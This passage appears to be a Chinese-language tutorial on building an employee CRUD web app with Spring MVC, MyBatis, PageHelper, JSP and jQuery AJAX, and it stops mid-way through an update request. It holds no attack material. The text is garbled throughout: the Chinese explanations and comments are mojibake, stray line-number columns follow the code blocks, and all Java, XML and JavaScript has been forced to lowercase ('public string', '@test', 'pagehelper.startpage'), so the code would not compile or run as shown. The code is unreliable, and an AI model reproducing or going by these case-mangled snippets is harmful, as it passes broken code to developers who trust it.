where emp_id = #{empid,jdbctype=integer}\n\n  </select>\n\n  \x3c!--èªå®ä¹èåæ¥è¯¢--\x3e\n  <sql id="withdept_column_list">\n    e.emp_id, e.emp_name, e.gender, e.email, e.dept_id , d.dept_name\n  </sql>\n\n  <resultmap id="withdeptresultmap" type="com.pwddd.ssm.bean.employee">\n    <id column="emp_id" jdbctype="integer" property="empid" />\n    <result column="emp_name" jdbctype="varchar" property="empname" />\n    <result column="gender" jdbctype="char" property="gender" />\n    <result column="email" jdbctype="varchar" property="email" />\n    <association property="department" javatype="com.pwddd.ssm.bean.department">\n      <result column="dept_id" property="deptid" />\n      <result column="dept_name" property="deptname" />\n    </association>\n  </resultmap> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# springæ³¨å¥ æµè¯daoå±\n\nä¸ºäºæ¹éæå¥æ°æ®åºï¼éè¦éç½®ä¸ä¸ªæ¹éæä½çsqlsession\n\n<bean class="org.mybatis.spring.sqlsessiontemplate" id="sqlsession">\n    <constructor-arg index="0" ref="sqlsessionfactory" />\n    <constructor-arg index="1" value="batch" />\n</bean>\n\n\n1\n2\n3\n4\n\n\næ¹éæå¥æ°æ®\n\n    @test\n    public void testemp(){\n        employeemapper mapper = sqlsession.getmapper(employeemapper.class);\n\n        for (int i = 0 ; i<=10000;i++){\n            mapper.insertselective(new employee(\n                uuid.randomuuid().tostring().substring(0,5),\n                "m",\n                uuid.randomuuid().tostring().substring(0,5)+"@qq.com",\n                1));\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ°æ®å¤ç\n\n\n# æ¥è¯¢åå·¥åè¡¨\n\n 1. ç¼åcontrollerï¼æ¥æ¶è¯·æ±\n\n@getmapping("/emps")\npublic string getemps(@requestparam(value = "pn",defaultvalue = "1")integer pn,\n                      @requestparam(value = "num",defaultvalue = "5")integer num,\n                      model model){\n    // è®¾ç½®åé¡µ\n    pagehelper.startpage(pn,num);\n    list<employee> employees = employeeservice.getemps();\n    pageinfo pageinfo = new pageinfo(employees,5);\n    model.addattribute("pageinfo",pageinfo);\n    return "list";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. éç½®åé¡µæä»¶\n\n<plugins>\n    <plugin interceptor="com.github.pagehelper.pageinterceptor" />\n</plugins>\n\n\n1\n2\n3\n\n 3. æµè¯æ¥è¯¢\n\nimport com.github.pagehelper.pageinfo;\nimport com.pwddd.ssm.bean.employee;\nimport org.junit.before;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.mock.web.mockhttpservletrequest;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit4.springjunit4classrunner;\nimport org.springframework.test.context.web.webappconfiguration;\nimport org.springframework.test.web.servlet.mockmvc;\nimport org.springframework.test.web.servlet.mockmvcbuilder;\nimport org.springframework.test.web.servlet.mvcresult;\nimport org.springframework.test.web.servlet.request.mockmvcrequestbuilders;\nimport org.springframework.test.web.servlet.setup.mockmvcbuilders;\nimport org.springframework.web.context.webapplicationcontext;\n\nimport java.util.list;\n\n@webappconfiguration\n@runwith(springjunit4classrunner.class)\n@contextconfiguration(locations = {"classpath:applicationcontext.xml","classpath:spring-mvc.xml"})\npublic class testmvc {\n\n    @autowired\n    private webapplicationcontext applicationcontext;\n\n    private mockmvc mockmvc;\n\n    @before\n    public void init(){\n        mockmvc = mockmvcbuilders.webappcontextsetup(applicationcontext).build();\n    }\n\n    @test\n    public void testselectallemps() throws exception {\n        mvcresult mvcresult = mockmvc.perform(mockmvcrequestbuilders.get("/emps")\n                .param("pn", "1").param("num", "20")).andreturn();\n        mockhttpservletrequest request = mvcresult.getrequest();\n        pageinfo pageinfo = (pageinfo) request.getattribute("pageinfo");\n        system.out.println(pageinfo);\n        list<employee> list = pageinfo.getlist();\n        for (employee employee :\n        list) {\n            system.out.println(employee.getempid());\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 4. ç¼åé¡µé¢,index.jspè®¾ç½®è·³è½¬æä»¬çè¯·æ±å°åã\n\n\n<%@ page language="java" contenttype="text/html; charset=utf-8"\n         pageencoding="utf-8"%>\n<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>\n<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">\n<html>\n<head>\n    <meta http-equiv="content-type" content="text/html; charset=utf-8">\n    <title>åå·¥åè¡¨</title>\n<%\n    pagecontext.setattribute("app_path", request.getcontextpath());\n%>\n    \x3c!-- webè·¯å¾ï¼\nä¸ä»¥/å¼å§çç¸å¯¹è·¯å¾ï¼æ¾èµæºï¼ä»¥å½åèµæºçè·¯å¾ä¸ºåºåï¼ç»å¸¸å®¹æåºé®é¢ã\nä»¥/å¼å§çç¸å¯¹è·¯å¾ï¼æ¾èµæºï¼ä»¥æå¡å¨çè·¯å¾ä¸ºæ å(http://localhost:3306)ï¼éè¦å ä¸é¡¹ç®å\n\t\thttp://localhost:3306/crud\n --\x3e\n    <script type="text/javascript"\n            src="${app_path}/static/js/jquery-1.12.4.min.js"><\/script>\n    <link\n            href="${app_path}/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n            rel="stylesheet">\n    <script\n            src="${app_path}/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n</head>\n<body>\n\x3c!-- æ­å»ºæ¾ç¤ºé¡µé¢ --\x3e\n<div class="container">\n    \x3c!-- æ é¢ --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <h1>ssm-crud</h1>\n        </div>\n    </div>\n    \x3c!-- æé® --\x3e\n    <div class="row">\n        <div class="col-md-4 col-md-offset-8">\n            <button class="btn btn-primary">æ°å¢</button>\n            <button class="btn btn-danger">å é¤</button>\n        </div>\n    </div>\n    \x3c!-- æ¾ç¤ºè¡¨æ ¼æ°æ® --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <table class="table table-hover">\n                <tr>\n                    <th>#</th>\n                    <th>empname</th>\n                    <th>gender</th>\n                    <th>email</th>\n                    <th>deptname</th>\n                    <th>æä½</th>\n                </tr>\n                <c:foreach items="${pageinfo.list }" var="emp">\n                    <tr>\n                        <th>${emp.empid }</th>\n                        <th>${emp.empname }</th>\n                        <th>${emp.gender=="m"?"ç·":"å¥³" }</th>\n                        <th>${emp.email }</th>\n                        <th>${emp.department.deptname }</th>\n                        <th>\n                            <button class="btn btn-primary btn-sm">\n                                <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>\n                                ç¼è¾\n                            </button>\n                            <button class="btn btn-danger btn-sm">\n                                <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>\n                                å é¤\n                            </button>\n                        </th>\n                    </tr>\n                </c:foreach>\n            </table>\n        </div>\n    </div>\n\n    \x3c!-- æ¾ç¤ºåé¡µä¿¡æ¯ --\x3e\n    <div class="row">\n        \x3c!--åé¡µæå­ä¿¡æ¯  --\x3e\n        <div class="col-md-6">å½å ${pageinfo.pagenum }é¡µ,æ»${pageinfo.pages }\n            é¡µ,æ» ${pageinfo.total } æ¡è®°å½</div>\n        \x3c!-- åé¡µæ¡ä¿¡æ¯ --\x3e\n        <div class="col-md-6">\n            <nav aria-label="page navigation">\n                <ul class="pagination">\n                    <li><a href="${app_path }/emps?pn=1">é¦é¡µ</a></li>\n                    <c:if test="${pageinfo.haspreviouspage }">\n                        <li><a href="${app_path }/emps?pn=${pageinfo.pagenum-1}"\n                               aria-label="previous"> <span aria-hidden="true">&laquo;</span>\n                        </a></li>\n                    </c:if>\n\n\n                    <c:foreach items="${pageinfo.navigatepagenums }" var="page_num">\n                        <c:if test="${page_num == pageinfo.pagenum }">\n                            <li class="active"><a href="#">${page_num }</a></li>\n                        </c:if>\n                        <c:if test="${page_num != pageinfo.pagenum }">\n                            <li><a href="${app_path }/emps?pn=${page_num }">${page_num }</a></li>\n                        </c:if>\n\n                    </c:foreach>\n                    <c:if test="${pageinfo.hasnextpage }">\n                        <li><a href="${app_path }/emps?pn=${pageinfo.pagenum+1 }"\n                               aria-label="next"> <span aria-hidden="true">&raquo;</span>\n                        </a></li>\n                    </c:if>\n                    <li><a href="${app_path }/emps?pn=${pageinfo.pages}">æ«é¡µ</a></li>\n                </ul>\n            </nav>\n        </div>\n    </div>\n\n</div>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n\n 5. æ³¨æï¼ideaèªå¨çæçweb-appçæ¬ä¸º2.3ï¼è¯¥çæ¬çweb-appå¹¶ä¸æ¯æelè¡¨è¾¾å¼ï¼å æ­¤æä»¬ç¼åçjspé¡µé¢ä¼åºéãéè¦å°web.xmlçææ¡£çº¦æä¿®æ¹ä¸ºå¦ä¸çåå®¹ï¼\n\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://xmlns.jcp.org/xml/ns/javaee\n         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"\n         version="3.1">\n\n\n1\n2\n3\n4\n5\n\n\n# ä½¿ç¨ajaxè¯·æ±\n\n//1ãé¡µé¢å è½½å®æä»¥åï¼ç´æ¥å»åéajaxè¯·æ±,è¦å°åé¡µæ°æ®\n$(function(){\n    //å»é¦é¡µ\n    to_page(1);\n});\nfunction to_page(pn){\n    $.ajax({\n        url:"${app_path}/emps",\n        data:"pn="+pn,\n        type:"get",\n        success:function(result){\n            //console.log(result);\n            //1ãè§£æå¹¶æ¾ç¤ºåå·¥æ°æ®\n            build_emps_table(result);\n            //2ãè§£æå¹¶æ¾ç¤ºåé¡µä¿¡æ¯\n            build_page_info(result);\n            //3ãè§£ææ¾ç¤ºåé¡µæ¡æ°æ®\n            build_page_nav(result);\n        }\n    });\n}\n\nfunction build_emps_table(result){\n    //æ¸ç©ºtableè¡¨æ ¼\n    $("#emps_table tbody").empty();\n    var emps = result.extend.pageinfo.list;\n    $.each(emps,function(index,item){\n        var checkboxtd = $("<td><input type=\'checkbox\' class=\'check_item\'/></td>");\n        var empidtd = $("<td></td>").append(item.empid);\n        var empnametd = $("<td></td>").append(item.empname);\n        var gendertd = $("<td></td>").append(item.gender==\'m\'?"ç·":"å¥³");\n        var emailtd = $("<td></td>").append(item.email);\n        var deptnametd = $("<td></td>").append(item.department.deptname);\n        /**\n             <button class="">\n             <span class="" aria-hidden="true"></span>\n             ç¼è¾\n             </button>\n             */\n        var editbtn = $("<button></button>").addclass("btn btn-primary btn-sm edit_btn")\n        .append($("<span></span>").addclass("glyphicon glyphicon-pencil")).append("ç¼è¾");\n        //ä¸ºç¼è¾æé®æ·»å ä¸ä¸ªèªå®ä¹çå±æ§ï¼æ¥è¡¨ç¤ºå½ååå·¥id\n        editbtn.attr("edit-id",item.empid);\n        var delbtn =  $("<button></button>").addclass("btn btn-danger btn-sm delete_btn")\n        .append($("<span></span>").addclass("glyphicon glyphicon-trash")).append("å é¤");\n        //ä¸ºå é¤æé®æ·»å ä¸ä¸ªèªå®ä¹çå±æ§æ¥è¡¨ç¤ºå½åå é¤çåå·¥id\n        delbtn.attr("del-id",item.empid);\n        var btntd = $("<td></td>").append(editbtn).append(" ").append(delbtn);\n        //var delbtn =\n        //appendæ¹æ³æ§è¡å®æä»¥åè¿æ¯è¿ååæ¥çåç´ \n        $("<tr></tr>").append(checkboxtd)\n            .append(empidtd)\n            .append(empnametd)\n            .append(gendertd)\n            .append(emailtd)\n            .append(deptnametd)\n            .append(btntd)\n            .appendto("#emps_table tbody");\n    });\n}\n//è§£ææ¾ç¤ºåé¡µä¿¡æ¯\nfunction build_page_info(result){\n    $("#page_info_area").empty();\n    $("#page_info_area").append("å½å"+result.extend.pageinfo.pagenum+"é¡µ,æ»"+\n                                result.extend.pageinfo.pages+"é¡µ,æ»"+\n                                result.extend.pageinfo.total+"æ¡è®°å½");\n    totalrecord = result.extend.pageinfo.total;\n    currentpage = result.extend.pageinfo.pagenum;\n}\n//è§£ææ¾ç¤ºåé¡µæ¡ï¼ç¹å»åé¡µè¦è½å»ä¸ä¸é¡µ....\nfunction build_page_nav(result){\n    //page_nav_area\n    $("#page_nav_area").empty();\n    var ul = $("<ul></ul>").addclass("pagination");\n\n    //æå»ºåç´ \n    var firstpageli = $("<li></li>").append($("<a></a>").append("é¦é¡µ").attr("href","#"));\n    var prepageli = $("<li></li>").append($("<a></a>").append("&laquo;"));\n    if(result.extend.pageinfo.haspreviouspage == false){\n        firstpageli.addclass("disabled");\n        prepageli.addclass("disabled");\n    }else{\n        //ä¸ºåç´ æ·»å ç¹å»ç¿»é¡µçäºä»¶\n        firstpageli.click(function(){\n            to_page(1);\n        });\n        prepageli.click(function(){\n            to_page(result.extend.pageinfo.pagenum -1);\n        });\n    }\n\n\n\n    var nextpageli = $("<li></li>").append($("<a></a>").append("&raquo;"));\n    var lastpageli = $("<li></li>").append($("<a></a>").append("æ«é¡µ").attr("href","#"));\n    if(result.extend.pageinfo.hasnextpage == false){\n        nextpageli.addclass("disabled");\n        lastpageli.addclass("disabled");\n    }else{\n        nextpageli.click(function(){\n            to_page(result.extend.pageinfo.pagenum +1);\n        });\n        lastpageli.click(function(){\n            to_page(result.extend.pageinfo.pages);\n        });\n    }\n\n\n\n    //æ·»å é¦é¡µååä¸é¡µ çæç¤º\n    ul.append(firstpageli).append(prepageli);\n    //1,2ï¼3éåç»ulä¸­æ·»å é¡µç æç¤º\n    $.each(result.extend.pageinfo.navigatepagenums,function(index,item){\n\n        var numli = $("<li></li>").append($("<a></a>").append(item));\n        if(result.extend.pageinfo.pagenum == item){\n            numli.addclass("active");\n        }\n        numli.click(function(){\n            to_page(item);\n        });\n        ul.append(numli);\n    });\n    //æ·»å ä¸ä¸é¡µåæ«é¡µ çæç¤º\n    ul.append(nextpageli).append(lastpageli);\n\n    //æulå å¥å°nav\n    var navele = $("<nav></nav>").append(ul);\n    navele.appendto("#page_nav_area");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n\n\nåå°ååºjsonæ°æ®ï¼éè¦å¼å¥jacksonï¼å¹¶è®¾ç½®@responsebodyæ³¨è§£\n\n\n# æ·»å é¡µé¢æ¾ç¤ºé¨é¨ä¸æåè¡¨\n\n 1. æ·»å é¨é¨controller\n\n@controller\npublic class deptcontroller {\n\n    @autowired\n    private deptserrvice deptserrvice;\n\n    @responsebody\n    @requestmapping("/depts")\n    public msg getalldepts(){\n        list<department> depts  = deptserrvice.getalldepts();\n        return msg.success().add("depts",depts);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. å½ç¨æ·ç¹å»ç¼è¾æé®æ¶ï¼åéajaxè¯·æ±ï¼è·åå°é¨é¨ä¿¡æ¯\n\n//æ¥åºææçé¨é¨ä¿¡æ¯å¹¶æ¾ç¤ºå¨ä¸æåè¡¨ä¸­\nfunction getdepts(ele){\n    //æ¸ç©ºä¹åä¸æåè¡¨çå¼\n    $(ele).empty();\n    $.ajax({\n        url:"${app_path}/depts",\n        type:"get",\n        success:function(result){\n            //{"code":100,"msg":"å¤çæåï¼",\n            //"extend":{"depts":[{"deptid":1,"deptname":"å¼åé¨"},{"deptid":2,"deptname":"æµè¯é¨"}]}}\n            //console.log(result);\n            //æ¾ç¤ºé¨é¨ä¿¡æ¯å¨ä¸æåè¡¨ä¸­\n            //$("#empaddmodal select").append("")\n            $.each(result.extend.depts,function(){\n                var optionele = $("<option></option>").append(this.deptname).attr("value",this.deptid);\n                optionele.appendto(ele);\n            });\n        }\n    });\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# æ£æµç¨æ·åæ¯å¦å¯ç¨\n\n 1. ç¼åå¯¹åºçè¯·æ±å¤çæ¹æ³\n\n@getmapping("/checkuser")\n@responsebody\npublic msg checkuser(@requestparam("empname")string empname){\n    boolean result = employeeservice.checkusername(empname);\n    if (result){\n        return msg.success();\n    }else {\n        return msg.fail().add("va_msg","ç¨æ·åä¸å¯ç¨ï¼");\n    }\n}\n\npublic boolean checkusername(string empname) {\n    employeeexample employeeexample = new employeeexample();\n    employeeexample.criteria criteria = employeeexample.createcriteria();\n    criteria.andempnameequalto(empname);\n    long empscount = employeemapper.countbyexample(employeeexample);\n    if (empscount == 0){\n        return true;\n    }else{\n        return false;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. åç«¯åèµ·ajaxè¯·æ±\n\n//æ ¡éªç¨æ·åæ¯å¦å¯ç¨\n$("#empname_add_input").change(function(){\n    //åéajaxè¯·æ±æ ¡éªç¨æ·åæ¯å¦å¯ç¨\n    var empname = this.value;\n    $.ajax({\n        url:"${app_path}/checkuser",\n        data:"empname="+empname,\n        type:"get",\n        success:function(result){\n            if(result.code==100){\n                show_validate_msg("#empname_add_input","success","ç¨æ·åå¯ç¨");\n                $("#emp_save_btn").attr("ajax-va","success");\n            }else{\n                show_validate_msg("#empname_add_input","error",result.extend.va_msg);\n                $("#emp_save_btn").attr("ajax-va","error");\n            }\n        }\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# ä¿å­ç¨æ·ä¿¡æ¯\n\n 1. ç¼åå¤çæ¥åä¿å­æ°æ®çæ¹æ³\n    \n    /**\n         * åå·¥ä¿å­\n         * 1ãæ¯æjsr303æ ¡éª\n         * 2ãå¯¼å¥hibernate-validator\n         *\n         *\n         * @return\n         */\n    @requestmapping(value="/emp",method=requestmethod.post)\n    @responsebody\n    public msg saveemp(@valid employee employee, bindingresult result){\n        if(result.haserrors()){\n            //æ ¡éªå¤±è´¥ï¼åºè¯¥è¿åå¤±è´¥ï¼å¨æ¨¡ææ¡ä¸­æ¾ç¤ºæ ¡éªå¤±è´¥çéè¯¯ä¿¡æ¯\n            map<string, object> map = new hashmap<>();\n            list<fielderror> errors = result.getfielderrors();\n            for (fielderror fielderror : errors) {\n                system.out.println("éè¯¯çå­æ®µåï¼"+fielderror.getfield());\n                system.out.println("éè¯¯ä¿¡æ¯ï¼"+fielderror.getdefaultmessage());\n                map.put(fielderror.getfield(), fielderror.getdefaultmessage());\n            }\n            return msg.fail().add("errorfields", map);\n        }else{\n            employeeservice.adduser(employee);\n            return msg.success();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 2. è®¾ç½®åç«¯jsr303æ ¡éª\n    \n    package com.pwddd.ssm.bean;\n    \n    import javax.validation.constraints.pattern;\n    \n    \n    \n    public class employee {\n        private integer empid;\n    \n        @pattern(regexp="(^[a-za-z0-9_-]{6,16}$)|(^[\\u2e80-\\u9fff]{2,5})"\n                 ,message="ç¨æ·åå¿é¡»æ¯2-5ä½ä¸­ææè6-16ä½è±æåæ°å­çç»å")\n        private string empname;\n    \n        private string gender;\n    \n        //@email\n        @pattern(regexp="^([a-z0-9_\\\\.-]+)@([\\\\da-z\\\\.-]+)\\\\.([a-z\\\\.]{2,6})$",\n                 message="é®ç®±æ ¼å¼ä¸æ­£ç¡®")\n        private string email;\n    \n        private integer did;\n    \n        //å¸ææ¥è¯¢åå·¥çåæ¶é¨é¨ä¿¡æ¯ä¹æ¯æ¥è¯¢å¥½ç\n        private department department;\n    \n    \n        public employee(string empname, string gender, string email, integer did) {\n            this.empname = empname;\n            this.gender = gender;\n            this.email = email;\n            this.did = did;\n        }\n    \n        @override\n        public string tostring() {\n            return "employee [empid=" + empid + ", empname=" + empname\n                + ", gender=" + gender + ", email=" + email + ", did=" + did\n                + "]";\n        }\n    \n        public employee() {\n            super();\n        }\n    \n        public employee(integer empid, string empname, string gender, string email,\n                        integer did) {\n            super();\n            this.empid = empid;\n            this.empname = empname;\n            this.gender = gender;\n            this.email = email;\n            this.did = did;\n        }\n    \n        public department getdepartment() {\n            return department;\n        }\n    \n        public void setdepartment(department department) {\n            this.department = department;\n        }\n    \n        public integer getempid() {\n            return empid;\n        }\n    \n        public void setempid(integer empid) {\n            this.empid = empid;\n        }\n    \n        public string getempname() {\n            return empname;\n        }\n    \n        public void setempname(string empname) {\n            this.empname = empname == null ? null : empname.trim();\n        }\n    \n        public string getgender() {\n            return gender;\n        }\n    \n        public void setgender(string gender) {\n            this.gender = gender == null ? null : gender.trim();\n        }\n    \n        public string getemail() {\n            return email;\n        }\n    \n        public void setemail(string email) {\n            this.email = email == null ? null : email.trim();\n        }\n    \n        public integer getdid() {\n            return did;\n        }\n    \n        public void setdid(integer did) {\n            this.did = did;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    87\n    88\n    89\n    90\n    91\n    92\n    93\n    94\n    95\n    96\n    97\n    98\n    99\n    100\n    101\n    102\n    103\n    \n\n 3. åç«¯ajaxå°è¡¨åä¿¡æ¯åéç»æå¡å¨\n    \n    //ç¹å»ä¿å­ï¼ä¿å­åå·¥ã\n    $("#emp_save_btn").click(function(){\n        //1ãæ¨¡ææ¡ä¸­å¡«åçè¡¨åæ°æ®æäº¤ç»æå¡å¨è¿è¡ä¿å­\n        //1ãåå¯¹è¦æäº¤ç»æå¡å¨çæ°æ®è¿è¡æ ¡éª\n        if(!validate_add_form()){\n            return false;\n        };\n        //1ãå¤æ­ä¹åçajaxç¨æ·åæ ¡éªæ¯å¦æåãå¦ææåã\n        if($(this).attr("ajax-va")=="error"){\n            return false;\n        }\n    \n        //2ãåéajaxè¯·æ±ä¿å­åå·¥\n        $.ajax({\n            url:"${app_path}/emp",\n            type:"post",\n            data:$("#empaddmodal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                if(result.code == 100){\n                    //åå·¥ä¿å­æåï¼\n                    //1ãå³é­æ¨¡ææ¡\n                    $("#empaddmodal").modal(\'hide\');\n    \n                    //2ãæ¥å°æåä¸é¡µï¼æ¾ç¤ºåæä¿å­çæ°æ®\n                    //åéajaxè¯·æ±æ¾ç¤ºæåä¸é¡µæ°æ®å³å¯\n                    to_page(totalrecord);\n                }else{\n                    //æ¾ç¤ºå¤±è´¥ä¿¡æ¯\n                    //console.log(result);\n                    //æåªä¸ªå­æ®µçéè¯¯ä¿¡æ¯å°±æ¾ç¤ºåªä¸ªå­æ®µçï¼\n                    if(undefined != result.extend.errorfields.email){\n                        //æ¾ç¤ºé®ç®±éè¯¯ä¿¡æ¯\n                        show_validate_msg("#email_add_input", "error", result.extend.errorfields.email);\n                    }\n                    if(undefined != result.extend.errorfields.empname){\n                        //æ¾ç¤ºåå·¥åå­çéè¯¯ä¿¡æ¯\n                        show_validate_msg("#empname_add_input", "error", result.extend.errorfields.empname);\n                    }\n                }\n            }\n        });\n    });\n    \n    //æ ¡éªè¡¨åæ°æ®\n    function validate_add_form(){\n        //1ãæ¿å°è¦æ ¡éªçæ°æ®ï¼ä½¿ç¨æ­£åè¡¨è¾¾å¼\n        var empname = $("#empname_add_input").val();\n        var regname = /(^[a-za-z0-9_-]{6,16}$)|(^[\\u2e80-\\u9fff]{2,5})/;\n        if(!regname.test(empname)){\n            //alert("ç¨æ·åå¯ä»¥æ¯2-5ä½ä¸­ææè6-16ä½è±æåæ°å­çç»å");\n            show_validate_msg("#empname_add_input", "error", "ç¨æ·åå¯ä»¥æ¯2-5ä½ä¸­ææè6-16ä½è±æåæ°å­çç»å");\n            return false;\n        }else{\n            show_validate_msg("#empname_add_input", "success", "");\n        };\n    \n        //2ãæ ¡éªé®ç®±ä¿¡æ¯\n        var email = $("#email_add_input").val();\n        var regemail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regemail.test(email)){\n            //alert("é®ç®±æ ¼å¼ä¸æ­£ç¡®");\n            //åºè¯¥æ¸ç©ºè¿ä¸ªåç´ ä¹åçæ ·å¼\n            show_validate_msg("#email_add_input", "error", "é®ç®±æ ¼å¼ä¸æ­£ç¡®");\n            /* $("#email_add_input").parent().addclass("has-error");\n                $("#email_add_input").next("span").text("é®ç®±æ ¼å¼ä¸æ­£ç¡®"); */\n            return false;\n        }else{\n            show_validate_msg("#email_add_input", "success", "");\n        }\n        return true;\n    }\n    \n    //æ¾ç¤ºæ ¡éªç»æçæç¤ºä¿¡æ¯\n    function show_validate_msg(ele,status,msg){\n        //æ¸é¤å½ååç´ çæ ¡éªç¶æ\n        $(ele).parent().removeclass("has-success has-error");\n        $(ele).next("span").text("");\n        if("success"==status){\n            $(ele).parent().addclass("has-success");\n            $(ele).next("span").text(msg);\n        }else if("error" == status){\n            $(ele).parent().addclass("has-error");\n            $(ele).next("span").text(msg);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    \n\n 4. æ·»å ç¨æ·åéè¦è·³è½¬å°æåä¸é¡µï¼æ¾ç¤ºæ·»å çæ°æ®ãå¨åé¡µæ¶éè¦ç¡®ä¿åé¡µçæä»¶æ¾ç¤ºçä¿¡æ¯å¨åççèå´ä¹åï¼éè¦å¯¹åé¡µæä»¶è¿è¡å±æ§çéç½®ãéç½®åé¡µåçååæ°ã\n    \n    <plugins>\n        <plugin interceptor="com.github.pagehelper.pageinterceptor" >\n            <property name="reasonable" value="true"/>\n        </plugin>\n    </plugins>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# æ´æ°åå·¥ä¿¡æ¯\n\n 1. åç«¯åèµ·ajaxè¯·æ±\n    \n    //ç¹å»æ´æ°ï¼æ´æ°åå·¥ä¿¡æ¯\n    $("#emp_update_btn").click(function(){\n        //éªè¯é®ç®±æ¯å¦åæ³\n        //1ãæ ¡éªé®ç®±ä¿¡æ¯\n        var email = $("#email_update_input").val();\n        var regemail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regemail.test(email)){\n            show_validate_msg("#email_update_input", "error", "é®ç®±æ ¼å¼ä¸æ­£ç¡®");\n            return false;\n        }else{\n            show_validate_msg("#email_update_input", "success", "");\n        }\n    \n        //2ãåéajaxè¯·æ±ä¿å­æ´æ°çåå·¥æ°æ®\n        $.ajax({\n            url:"${app_path}/emp/"+$(this).attr("edit-id"),\n            type:"put",\n            data:$("#empupdatemodal form").serialize(),\n            